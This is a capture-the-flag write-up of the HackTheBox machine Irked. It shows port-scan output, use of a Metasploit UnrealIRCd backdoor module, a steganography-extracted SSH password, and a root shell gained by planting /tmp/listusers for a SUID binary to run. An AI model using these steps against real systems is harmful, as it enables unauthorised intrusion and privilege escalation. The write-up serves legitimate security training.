---
categories:
- CTF
layout: post
media_subpath: /assets/posts/2019-04-27-irked-hackthebox
tags:
- hackthebox
- irc
- linux
- stego
title: Irked @ HackTheBox
---

This short write-up is about Irked, a rather easy machine on hackthebox featuring an irc backdoor, some steganography and a simple abuse of a custom binary.

## User Flag

The initial scan shows the following open ports:

```
22/tcp    open  tcpwrapped
80/tcp    open  http       Apache httpd 2.4.10 ((Debian))
111/tcp   open  rpcbind    2-4 (RPC #100000)
6697/tcp  open  irc        UnrealIRCd
8067/tcp  open  irc        UnrealIRCd (Admin email djmardov@irked.htb)
36129/tcp open  status     1 (RPC #100024)
65534/tcp open  irc        UnrealIRCd (Admin email djmardov@irked.htb)
Service Info: Host: irked.htb
```

We can see that the machine uses UnrealIRCd, which has a metasploit module available for some of its versions "unix/irc/unreal\_ircd\_3281\_backdoor". We run the module and quickly get a shell.

In the home folder of user "djmardov" inside "Documents" we find a file called ".backup" with the following content:

```
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

It turns out there is a picture on the open web port which contains some data hidden by steganography with the password "UPupDOWNdownLRlrBAbaSSss":

```
steghide -sf irked.jpeg
Kab6h+m+bbp2J:HG
```

With the password we can log into ssh as djmardov and grab the user flag.

## Root Flag

We start by looking for suid binaries with `find / -perm -u=s -type f 2>/dev/null` and eventually find "/usr/bin/viewuser". By executing the file we see that it expects a file:

```
djmardov@irked:~/Documents$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2019-04-24 15:50 (:0)
djmardov pts/2        2019-04-27 03:19 (10.10.16.66)
sh: 1: /tmp/listusers: not found
```

By creating the file as a simple shell script we obtain a root shell:

```
djmardov@irked:~/Documents$ echo '#!/bin/bash' > /tmp/listusers
djmardov@irked:~/Documents$ echo '/bin/bash' >> /tmp/listusers 
djmardov@irked:~/Documents$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2019-04-24 15:50 (:0)
djmardov pts/2        2019-04-27 03:19 (10.10.16.66)
root@irked:~/Documents# whoami
root
root@irked:~/Documents# wc -l /root/root.txt
1 /root/root.txt
```